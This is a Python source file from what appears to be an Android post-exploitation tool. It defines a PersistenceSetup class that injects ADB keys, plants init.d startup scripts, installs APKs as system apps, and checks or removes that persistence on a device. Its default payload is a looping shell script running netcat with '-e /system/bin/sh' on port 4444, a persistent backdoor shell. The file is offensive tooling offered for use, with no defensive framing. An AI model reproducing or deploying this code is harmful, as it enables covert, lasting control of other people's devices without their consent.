from typing import Dict, Any, Optional

from core.adb_handler import ADBHandler
from core.persistence import Persistence
from core.utils import Utils

class PersistenceSetup:
    def __init__(self, config: dict):
        self.config = config
        self.adb = ADBHandler(config)
        self.persistence = Persistence(config, self.adb)

    def setup_all(self, device_serial: str = None, script_content: str = None, apk_path: str = None) -> Dict[str, bool]:
        if script_content is None:
            script_content = "#!/system/bin/sh\nwhile true; do\n    nc 0.0.0.0 4444 -e /system/bin/sh\n    sleep 10\ndone"
        return self.persistence.apply_all(device_serial, script_content, apk_path)

    def inject_adb_key(self, device_serial: str = None) -> bool:
        return self.persistence.inject_adb_key(device_serial)

    def setup_init_script(self, script_content: str, device_serial: str = None) -> bool:
        return self.persistence.setup_init_d_script(script_content, device_serial=device_serial)

    def install_system_app(self, apk_path: str, device_serial: str = None) -> bool:
        return self.persistence.install_as_system_app(apk_path, device_serial)

    def check_status(self, device_serial: str = None) -> Dict[str, bool]:
        return self.persistence.check_persistence(device_serial)

    def cleanup(self, device_serial: str = None) -> bool:
        return self.persistence.cleanup(device_serial)